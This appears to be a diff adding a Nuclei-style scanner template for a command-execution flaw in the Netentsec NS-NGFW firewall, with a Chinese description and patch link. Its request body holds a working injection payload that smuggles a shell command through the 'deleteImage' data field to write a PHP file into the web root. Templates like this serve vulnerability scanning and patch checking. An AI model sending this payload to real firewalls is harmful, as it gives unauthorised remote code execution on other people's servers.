@@ -1,0 +1,48 @@
+id: Netentsec-Ngfw-Rce
+info:
+  name: 网康下一代防火墙_任意命令执行漏洞
+  author:
+  - l0ne1y
+  tags:
+  - netentsec
+  - rce
+  description: |-
+    网康下一代防火墙任意命令执行漏洞
+    北京网康科技有限公司下一代防火墙NS-NGFW是一款可全面应对网络威胁的高性能应用层防火墙。
+
+    北京网康科技有限公司下一代防火墙NS-NGFW存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。
+  reference:
+  - https://mp.weixin.qq.com/s/wh5lulise_g381w2ssv93g
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.netentsec.com/product/lists_265.html
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - SSLVPN_Resource
+    - '"result":{"success":true}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/directdata/direct/router'
+  method: POST
+  body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
+    ''<?php echo {{randstr}};unlink(__FILE__);?>'' >/var/www/html/xASDasda.php"]}],"type":"rpc","tid":17}'
+- matchers:
+  - type: word
+    words:
+    - '{{randstr}}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/xASDasda.php'
+  method: GET
+  body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
+    ''<?php echo {{randstr}};unlink(__FILE__);?>'' >/var/www/html/xASDasda.php"]}],"type":"rpc","tid":17}'
